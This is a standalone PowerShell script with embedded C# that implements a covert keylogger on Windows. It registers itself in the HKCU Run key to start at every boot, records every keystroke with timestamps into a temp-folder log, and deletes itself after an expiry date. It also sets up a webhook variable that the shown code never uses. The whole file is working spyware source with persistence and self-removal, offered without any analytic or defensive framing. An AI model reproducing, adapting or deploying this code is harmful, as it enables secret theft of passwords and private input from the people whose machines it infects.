# Add this script to startup to ensure it runs every time the system boots
$scriptPath = $MyInvocation.MyCommand.Path  # Path of this script
$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptName = "MyStartupScript2"  # You can change this name if you like

# Check if the script is already added to startup to avoid duplicates
$existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
if ($existingEntry) {
    Write-Host "Script is already added to startup." -ForegroundColor Yellow
} else {
    # Add the script to startup
    try {
        Set-ItemProperty -Path $regKey -Name $scriptName -Value "$scriptPath"
        Write-Host "Script added to startup." -ForegroundColor Green
    }
    catch {
        Write-Host "Error adding script to startup:" -ForegroundColor Red
        Write-Host $_.Exception.Message
    }

    # Confirm that the entry has been added to the registry
    $confirmation = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
    if ($confirmation) {
        Write-Host "Script successfully added to startup." -ForegroundColor Green
    } else {
        Write-Host "Failed to add script to startup." -ForegroundColor Red
    }
}

# Ensure that the webhook URL is set directly from the command line
$webhookURL = $dc  # $webhookURL is the variable passed via the command line

# Define the path to the temp log file
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')

# Set the default expiry date to 30 days from today if no expiry date is passed
if ($args.Count -gt 1) {
    # If the second argument is provided, parse it as the expiry date
    $expiryDate = [datetime]::ParseExact($args[1], 'yyyy-MM-dd', $null)
} else {
    # If no expiry date is passed, default to 30 days from today
    $expiryDate = (Get-Date).AddDays(30)
}

# Check if the script has expired
$currentDate = Get-Date
if ($currentDate -gt $expiryDate) {
    # If the script has expired, delete itself
    Write-Host "Script has expired. Deleting script file..."
    Remove-Item $MyInvocation.MyCommand.Path -Force
    exit
}

# Check if the custom utility type is already loaded
$customUtilityType = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { 
    $_.GetTypes() | Where-Object { $_.Name -eq 'KeyCaptureUtility' }
}

if (-not $customUtilityType) {
    # Add Type for custom utility class
    Add-Type @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class KeyCaptureUtility
{
    // DLL Imports for keyboard input functions
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);

    public static void CaptureInput(string filePath)
    {
        StringBuilder captureBuffer = new StringBuilder();
        var lastKeypressTime = System.Diagnostics.Stopwatch.StartNew();
        TimeSpan keypressThreshold = TimeSpan.FromSeconds(10);

        // Ensure the file exists, create it if it doesn't
        if (!File.Exists(filePath))
        {
            File.Create(filePath).Dispose();
            Console.WriteLine("File created: " + filePath);  // Log file creation
        }

        // Continuous loop to capture keypresses
        while (true)
        {
            bool keyPressed = false;

            // Check if the last key press time exceeds threshold
            while (lastKeypressTime.Elapsed < keypressThreshold)
            {
                Thread.Sleep(30);  // Sleep for 30 ms

                // Iterate through all possible virtual keycodes
                for (int asc = 8; asc <= 254; asc++)
                {
                    short keyst = GetAsyncKeyState(asc);

                    // Check if the key is pressed (key state = -32767 means pressed)
                    if (keyst == -32767)
                    {
                        keyPressed = true;
                        lastKeypressTime.Restart();  // Reset inactivity timer

                        // Translate the key to a readable character
                        int vtkey = MapVirtualKey((uint)asc, 3);
                        byte[] kbst = new byte[256];
                        GetKeyboardState(kbst);
                        StringBuilder logChar = new StringBuilder();

                        // Get the character for the key
                        if (ToUnicode((uint)asc, (uint)vtkey, kbst, logChar, logChar.Capacity, 0) != 0)
                        {
                            string charPressed = logChar.ToString();

                            // Handle special keys based on provided mapping
                            switch (asc)
                            {
                                case 8: charPressed = "[BKSP]"; break;  // Backspace
                                case 13: charPressed = "[ENTER]"; break;  // Enter
                                case 27: charPressed = "[ESC]"; break;  // Escape
                                case 9: charPressed = "[TAB]"; break;  // Tab
                                case 32: charPressed = "[SPACE]"; break;  // Space bar
                                case 46: charPressed = "[DEL]"; break;  // Delete
                                case 37: charPressed = "[LEFT]"; break;  // Left Arrow
                                case 38: charPressed = "[UP]"; break;  // Up Arrow
                                case 39: charPressed = "[RIGHT]"; break;  // Right Arrow
                                case 40: charPressed = "[DOWN]"; break;  // Down Arrow
                                case 33: charPressed = "[PGUP]"; break;  // Page Up
                                case 34: charPressed = "[PGDN]"; break;  // Page Down
                                case 35: charPressed = "[END]"; break;  // End
                                case 36: charPressed = "[HOME]"; break;  // Home
                                case 144: charPressed = "[NUMLOCK]"; break;  // Num Lock
                                case 145: charPressed = "[SCROLLLOCK]"; break;  // Scroll Lock
                                case 112: charPressed = "[F1]"; break;  // F1
                                case 113: charPressed = "[F2]"; break;  // F2
                                case 114: charPressed = "[F3]"; break;  // F3
                                case 115: charPressed = "[F4]"; break;  // F4
                                case 116: charPressed = "[F5]"; break;  // F5
                                case 117: charPressed = "[F6]"; break;  // F6
                                case 118: charPressed = "[F7]"; break;  // F7
                                case 119: charPressed = "[F8]"; break;  // F8
                                case 120: charPressed = "[F9]"; break;  // F9
                                case 121: charPressed = "[F10]"; break;  // F10
                                case 122: charPressed = "[F11]"; break;  // F11
                                case 123: charPressed = "[F12]"; break;  // F12
                                // Numeric keypad keys
                                case 96: charPressed = "[NUMPAD0]"; break;  // NumPad 0
                                case 97: charPressed = "[NUMPAD1]"; break;  // NumPad 1
                                case 98: charPressed = "[NUMPAD2]"; break;  // NumPad 2
                                case 99: charPressed = "[NUMPAD3]"; break;  // NumPad 3
                                case 100: charPressed = "[NUMPAD4]"; break;  // NumPad 4
                                case 101: charPressed = "[NUMPAD5]"; break;  // NumPad 5
                                case 102: charPressed = "[NUMPAD6]"; break;  // NumPad 6
                                case 103: charPressed = "[NUMPAD7]"; break;  // NumPad 7
                                case 104: charPressed = "[NUMPAD8]"; break;  // NumPad 8
                                case 105: charPressed = "[NUMPAD9]"; break;  // NumPad 9
                                case 107: charPressed = "[NUMPAD+]"; break;  // NumPad +
                                case 109: charPressed = "[NUMPAD-]"; break;  // NumPad -
                                case 187: charPressed = "[NUMPAD=]"; break;  // NumPad =
                                // Special keys for Alt, Shift, Control
                                case 91: charPressed = "[WINDOWS]"; break;  // Windows key
                                case 160: charPressed = "[SHIFT]"; break;  // Left Shift
                                case 162: charPressed = "[CONTROL]"; break;  // Left Control
                                case 163: charPressed = "[RIGHT CONTROL]"; break;  // Right Control
                                case 164: charPressed = "[LEFT ALT]"; break;  // Left Alt
                                case 165: charPressed = "[RIGHT ALT]"; break;  // Right Alt
                                case 220: charPressed = "[BACKSLASH]"; break;  // Backslash
                                case 20: charPressed = "[CAPSLOCK]"; break;  // Caps Lock
                            }

                            captureBuffer.Append(charPressed);
                        }
                    }
                }
            }

            if (keyPressed)
            {
                // Save input to the file with a timestamp
                string timestamp = DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss");
                string message = timestamp + " : " + captureBuffer.ToString() + "\r\n";
                File.AppendAllText(filePath, message);
                Console.WriteLine("Input saved: " + message);  // Log the saved message
                captureBuffer.Clear();  // Clear the input buffer after saving
            }

            // Reset the stopwatch and continue checking
            lastKeypressTime.Restart();
        }
    }
}

"@
}

# Call the CaptureInput method to start capturing inputs (synchronously)
[KeyCaptureUtility]::CaptureInput($tempFilePath)
